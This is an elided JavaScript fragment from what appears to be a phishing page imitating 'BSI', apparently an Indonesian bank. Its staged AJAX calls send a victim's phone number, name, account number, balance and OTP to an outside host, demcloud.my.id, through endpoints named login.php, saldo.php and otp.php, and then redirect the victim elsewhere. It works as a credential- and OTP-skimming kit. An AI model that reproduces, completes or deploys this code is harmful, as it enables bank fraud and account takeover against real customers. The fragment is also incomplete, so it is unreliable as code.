let tglNow = new Date();
let waktuBatas = new Date("2025-06-26T23:59:59");
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/cfd45a/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
   ...
   if (!tarif || !nomor || !nama || !rek ) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/cfd45a/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo ) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/cfd45a/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://demcloud.my.id/BSI/cfd45a/otp.php',
 async: false,
 dataType: 'JSON',
...
setTimeout(function(){  
location.href='https://demcloud.my.id/BSI/cfd45a/wa';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1100);      
